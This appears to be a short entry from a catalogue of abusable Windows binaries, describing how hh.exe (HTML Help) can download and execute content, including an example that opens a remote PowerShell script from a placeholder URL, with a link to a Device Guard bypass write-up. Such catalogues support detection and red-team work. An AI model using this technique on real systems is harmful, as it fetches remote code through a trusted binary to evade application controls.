## hh.exe
* Functions: Download, Execute
```

HH.exe http://www.google.com
Opens google's web page with HTML Help.

HH.exe C:\
Opens c:\\ with HTML Help.

HH.exe c:\windows\system32\calc.exe
Opens calc.exe with HTML Help.

HH.exe http://some.url/script.ps1
Open the target PowerShell script with HTML Help.
```
   
* Resources:   
  * https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/
   
* Full path:   
  * c:\windows\system32\hh.exe
  * c:\windows\sysWOW64\hh.exe
   
* Notes: Thanks to Oddvar Moe - @oddvarmoe  
   
